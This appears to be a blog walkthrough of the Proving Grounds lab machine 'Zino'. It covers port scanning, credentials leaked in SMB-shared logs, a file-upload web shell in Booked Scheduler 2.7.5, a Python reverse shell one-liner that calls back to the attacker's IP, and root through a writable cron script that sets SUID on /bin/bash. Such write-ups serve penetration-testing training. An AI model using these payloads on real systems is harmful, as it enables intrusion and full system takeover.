---
layout: post
title: Proving Grounds Practice Zino  
subtitle: Intermediate
tags: [PG]
---

| Name | Zino |
| :------ |:--- |
| OS | Linux |
| DIFFICULTY | Intermediate |

# Port Scan

I started with a very quick nmap scan to identify open ports. I do this so I can work on testing the machine while more scans run. 
```
nmap 192.168.172.64 -p- --min-rate 1000 -oN allPorts.nmap -v
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
8003/tcp open  mcreport
```

After the initial scan finished I started another `nmap` scan this time using some  `nse` scripts. 
```
nmap -p 21,22,139,115,3306,8003 -sVC 192.168.172.64 -oN scriptScan.nmap
PORT     STATE    SERVICE     VERSION
21/tcp   open     ftp         vsftpd 3.0.3
22/tcp   open     ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:                                                                
|   2048 b2:66:75:50:1b:18:f5:e9:9f:db:2c:d4:e3:95:7a:44 (RSA)
|   256 91:2d:26:f1:ba:af:d1:8b:69:8f:81:4a:32:af:9c:77 (ECDSA)
|_  256 ec:6f:df:8b:ce:19:13:8a:52:57:3e:72:a3:14:6f:40 (ED25519)
115/tcp  filtered sftp
139/tcp  open     netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open     mysql?
| fingerprint-strings:             
|   NULL:            
|_    Host '192.168.49.172' is not allowed to connect to this MariaDB server
8003/tcp open     http        Apache httpd 2.4.38
| http-ls: Volume /
| SIZE  TIME              FILENAME                                                                                                                           
| -     2019-02-05 21:02  booked/                                             
|_
|_http-title: Index of /               
|_http-server-header: Apache/2.4.38 (Debian)
```

There are 6 total open ports. My top 3 that I will start testing are 21 FTP, SMB 139, and HTTP 8003. These protocols usually have the biggest attack surface. 

# FTP 21
The two things that I check against an FTP server are anonymous login and banner grabbing. These are really the only two unauthenticated attacks that can be done against an FTP server.

### Anonymous login
Anonymous login failed
```
┌──(root㉿kali)-[~/provingGrounds/zino]
└─# ftp 192.168.172.64                                                                                                      
Connected to 192.168.172.64.
220 (vsFTPd 3.0.3)
Name (192.168.172.64:root): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed

```

### Version 
This server is running `vsFTPd 3.0.3`, I could not find any public exploits so I will move on to the next protocol

# SMB 139 445

I used `smbmap` to get a list of shares available on this server. `zino` is the only one that I have access to and it has a description of "Logs"

```
┌──(root㉿kali)-[~/provingGrounds/zino]
└─# smbmap -H 192.168.172.64            
[+] IP: 192.168.172.64:445      Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        zino                                                    READ ONLY       Logs
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian)
```

Inside the share is a list of logs. I downloaded each one to do some analysis on them and see if there is any useful information in them. 
```
┌──(root㉿kali)-[~/provingGrounds/zino]
└─# smbclient -N \\\\192.168.172.64\\zino
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jul  9 15:11:49 2020
  ..                                  D        0  Tue Apr 28 09:38:53 2020
  .bash_history                       H        0  Tue Apr 28 11:35:28 2020
  error.log                           N      265  Tue Apr 28 10:07:32 2020
  .bash_logout                        H      220  Tue Apr 28 09:38:53 2020
  local.txt                           N       33  Mon Oct  3 13:08:36 2022
  .bashrc                             H     3526  Tue Apr 28 09:38:53 2020
  .gnupg                             DH        0  Tue Apr 28 10:17:02 2020
  .profile                            H      807  Tue Apr 28 09:38:53 2020
  misc.log                            N      424  Tue Apr 28 10:08:15 2020
  auth.log                            N      368  Tue Apr 28 10:07:54 2020
  access.log                          N     5464  Tue Apr 28 10:07:09 2020
  ftp                                 D        0  Tue Apr 28 10:12:56 2020
```

Inside `auth.log` I can see that there is a user named `peter`, we could potentially brute force with that username. 
```
──(root㉿kali)-[~/provingGrounds/zino]
└─# cat auth.log  
Apr 28 08:16:54 zino groupadd[1044]: new group: name=peter, GID=1001
Apr 28 08:16:54 zino useradd[1048]: new user: name=peter, UID=1001, GID=1001, home=/home/peter, shell=/bin/bash
Apr 28 08:17:01 zino passwd[1056]: pam_unix(passwd:chauthtok): password changed for peter
Apr 28 08:17:01 zino CRON[1058]: pam_unix(cron:session): session opened for user root by (uid=0)
```

Inside `misc.log` it shows that the system started an application and set a username and password, `admin:adminadmin`. These are good creds to add to my collection 
```
┌──(root㉿kali)-[~/provingGrounds/zino]
└─# cat misc.log 
Apr 28 08:39:01 zino systemd[1]: Starting Clean php session files...
Apr 28 08:39:01 zino CRON[2791]: (CRON) info (No MTA installed, discarding output)
Apr 28 08:39:01 zino systemd[1]: phpsessionclean.service: Succeeded.
Apr 28 08:39:01 zino systemd[1]: Started Clean php session files.
Apr 28 08:39:01 zino systemd[1]: Set application username "admin"
Apr 28 08:39:01 zino systemd[1]: Set application password "adminadmin"
```

![Zino](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/zino/image1.jpg)

There was not anything else inside the logs that are useful. I will move onto the HTTP site

# HTTP 8003 Apache

This site is running "Booked Scheduler v2.7.5". Its some kind of booking CMS.

![Zino](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/zino/image2.png)

I tried the credentials I found earlier `admin:adminadmin` and I got in!

![Zino](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/zino/image3.png)

From here I googled "Booked Scheduler v2.7.5 exploit" and I found a [github repo](https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF) that showed how to get remote code execution on this machine. 

There were X simple steps to exploit this machine. 
1. Navigate to manage_theme.php page

![Zino](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/zino/image4.png)

2. Upload rce.php `<?php system($_GET['cmd']); ?>` as the Favicon

![Zino](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/zino/image5.png)

3.  Navigate to http://192.168.172.64:8003/booked/Web/custom-favicon.php?cmd= to run commands!

![Zino](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/zino/image6.png)

From here I used a `python` reverse shell one-liner to get a reverse shell

```
http://192.168.172.64:8003/booked/Web/custom-favicon.php?cmd=python%20-c%20%27import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.172%22,21));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/sh%22)%27
```

```
┌──(root㉿kali)-[/opt/linuxPrivEsc]
└─# nc -lvnp 21
listening on [any] 21 ...
connect to [192.168.49.172] from (UNKNOWN) [192.168.172.64] 59182
$ 
```

Next, I used `python` to get a tty shell

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'                   
www-data@zino:/var/www/html/booked/Web$
```

# Root

I downloaded [pspy](https://github.com/DominicBreuker/pspy) onto the machine so I could look into the running processes of this machine. While looking I saw that root was executing a script about every three minutes
```
2022/10/03 17:54:01 CMD: UID=0    PID=19521  | /usr/sbin/CRON -f 
2022/10/03 17:54:01 CMD: UID=0    PID=19522  | /usr/sbin/CRON -f 
2022/10/03 17:54:01 CMD: UID=0    PID=19523  | /bin/sh -c    python /var/www/html/booked/cleanup.py 
2022/10/03 17:54:01 CMD: UID=0    PID=19524  | python /var/www/html/booked/cleanup.py
```

The `crontab` confirmed that every 3 minutes root would run `cleanup.py`
```
$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/3 *   * * *   root    python /var/www/html/booked/cleanup.py
#
```

Checking the permissions of the file my user `www-data` has access to write to this file. I removed the contents and put in a malicious command to set the SUID bit on `/bin/bash` allowing me to get a root shell

```
$ cat cleanup.py
cat cleanup.py
#!/usr/bin/env python
import os
os.system('chmod u+s /bin/bash')
```

After 3 minutes I can see that the `S` bit has been set and getting to root is trivial 
```
$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
$ bash -p
bash -p
bash-5.0# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
bash-5.0# cd /root
cd /root
bash-5.0# ls
ls
proof.txt
```
